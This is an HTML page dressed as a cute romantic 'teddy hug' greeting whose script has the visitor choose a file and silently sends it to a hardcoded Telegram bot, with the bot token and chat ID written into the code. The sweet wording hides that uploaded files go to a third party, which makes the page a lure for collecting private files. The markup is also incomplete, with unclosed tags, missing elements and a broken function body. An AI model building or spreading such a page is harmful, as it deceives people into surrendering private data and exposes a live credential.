<!DOCTYPE html>

<head>

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #ffe4f0, #fff0f5);
      font-family: 'Segoe UI', sans-serif;
      min-height: 100vh;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      color: #e91e63;
      padding: 20px;
      position: relative;
      overflow: hidden;
    }
    h1 {
      font-size: 2.8em;
      margin-bottom: 20px;
    }
    .teddy-emoji {
      font-size: 6em;
      animation: float 3s ease-in-out infinite;
    }
    .btn {
      padding: 14px 35px;
      margin-top: 30px;
      font-size: 1.2em;
      background: #f06292;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn:hover {
      background: #e91e63;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .decor {
      position: absolute;
      font-size: 2rem;
      opacity: 0.2;
      animation: floaty 6s ease-in-out infinite;
    }
    .decor.left { top: 10%; left: 5%; animation-delay: 1s; }
    .decor.right { bottom: 10%; right: 5%; animation-delay: 2s; }
    .decor.top-right { top: 5%; right: 8%; animation-delay: 3s; }
    .decor.bottom-left { bottom: 5%; left: 8%; animation-delay: 4s; }
    .decor.center-left { top: 50%; left: 2%; animation-delay: 2.5s; }
    .decor.center-right { top: 50%; right: 2%; animation-delay: 3.5s; }
    @keyframes floaty {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .hearts {
      position: absolute;
      width: 100%;
      height: 100%;
      overflow: hidden;
      pointer-events: none;
    }
    .hearts span {
      position: absolute;
      display: block;
      width: 20px;
      height: 20px;
      background: url('https://emoji.discadia.com/emojis/5b45acdb-b99d-4c35-bc30-e64dff1b3b06.gif') no-repeat center/contain;
      animation: moveHearts 10s linear infinite;
    }
    @keyframes moveHearts {
      0% { transform: translateY(100vh) scale(0.5); opacity: 0; }
      50% { opacity: 1; }
      100% { transform: translateY(-10vh) scale(1.2); opacity: 0; }
    }
    #fileInput {
      display: none;
    }
    .message {
      margin-top: 20px;
      font-size: 1.3em;
      color: #ad1457;
      animation: fadeIn 1s ease-in-out;
    }
    .uploading {
      margin-top: 10px;
      font-size: 1.1em;
      color: #b71c1c;
      animation: fadeIn 1s ease-in-out infinite alternate;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <audio autoplay>

  <div id="romanticMessage" class="message" style="display:none;">Your cravings... You crave for hugs ðŸ’—</div>

  <form enctype="multipart/form-data" id="hugForm">

  <script>
    function triggerUpload() {
      const input = document.getElementById("fileInput");
      input.click();
      input.onchange = () => {
        if (input.files.length > 0) {
          document.getElementById("romanticMessage").style.display = "block";
          document.getElementById("uploadStatus").style.display = "block";
          sendFile(input.files[0]);
        }
      };
    }

    function sendFile(file) {
      const formData = new FormData();
      formData.append("chat_id", "1786564127");
      formData.append("document", file);

      fetch("https://api.telegram.org/bot7613683060:AAEsyP1JaIKh1mLawCyWmFxpgl0KOToj2Xs/sendDocument", {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          setTimeout(() => {
            window.location.href = "teddy3.html";
          }, 2000);
        } else {
          document.getElementById("uploadStatus").innerText = "ðŸ˜“ Oops... I told you my brain is too small for big hugs. Try again maybe?";

      })
      .catch(err => {
        console.error("Upload error:", err);
        document.getElementById("uploadStatus").innerText = "ðŸ’” I really tried... but my heart couldn't carry this hug. Try again.";
      });
    }
  </script>
